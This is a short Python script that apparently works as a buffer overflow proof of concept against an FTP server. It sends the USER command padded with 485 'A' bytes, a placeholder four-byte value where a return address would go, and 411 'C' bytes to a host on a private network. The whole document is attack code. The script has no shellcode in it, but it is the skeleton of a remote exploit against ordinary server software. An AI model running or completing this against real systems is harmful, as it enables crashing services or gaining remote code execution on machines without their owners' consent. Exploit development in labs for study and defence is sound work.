import socket

buffer = b'A' * 485 + b'\x01\x02\x03\x04' + b'C' * 411

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.11", 21))
s.send(b'USER ' + buffer  + b'\r\n')